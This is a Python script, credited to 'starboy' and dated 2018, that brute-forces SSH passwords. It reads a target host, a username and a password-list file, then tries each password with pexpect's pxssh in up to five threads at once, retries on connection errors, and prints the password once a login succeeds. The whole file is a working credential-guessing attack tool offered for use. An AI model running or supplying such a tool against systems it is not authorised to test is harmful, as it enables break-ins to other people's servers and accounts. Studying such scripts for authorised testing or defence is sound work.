#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue May  8 03:22:07 2018

@author: starboy
"""

# Brute forcing ssh passwords

import optparse
import time
from pexpect import pxssh
from threading import *

# Global variables
max_connections = 5
connection_lock = BoundedSemaphore(value = max_connections)
Found = False
Fails = 0

# Function to test connection
def connect(host, user, password, release):
    global Found
    global Fails
    
    # Try loging in using the password 
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Print password found: '+ password)
        Found = True # Change flag
        
    # If fails then check the error message, act accordingly
    # Recursive calls ensure loop runs until password is found    
    except Exception as e:
        if 'read_nonblocking' in str(e):
            print('Conn failed, trying in 5')
            Fails += 1
            time.sleep(5)
            connect(host,user, password, False)
            
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user, password, False)
    
    finally:
        # if release is true then release the lock
        if release:
            connection_lock.release()

# Option parsing
parser = optparse.OptionParser('Usage:: -H <target host> -u <user> -p <pwd list file>')
parser.add_option('-H', dest='t_host', type='string', help='enter target host')
parser.add_option('-u', dest='username', type='string', help='enter the username')
parser.add_option('-p', dest='password_file', type='string', help='enter the password file name')

(options, args) = parser.parse_args()
host = options.t_host
passwd_file = options.password_file
user = options.username


# Check if parameters entered are empty
if (host == None) or (passwd_file == None) or (user == None):
    print(parser.usage)
    exit(0)

# Open the password file and run connect for each
f = open(passwd_file, 'r')

# Each line in the file is one password
for line in f.readlines():
    if Found:
        print('[+] Exiting : Password Found')
        exit(0)
        
    if Fails > 5:
        print('[!] Exiting : Too many failed attempts')
        exit(0)
        
    # Locking resources using Semaphore    
    connection_lock.acquire()
    
    print('[+] Testing password : '+line)
    
    t = Thread(target = connect, args = (host, user, line, True))
    child = t.start()
    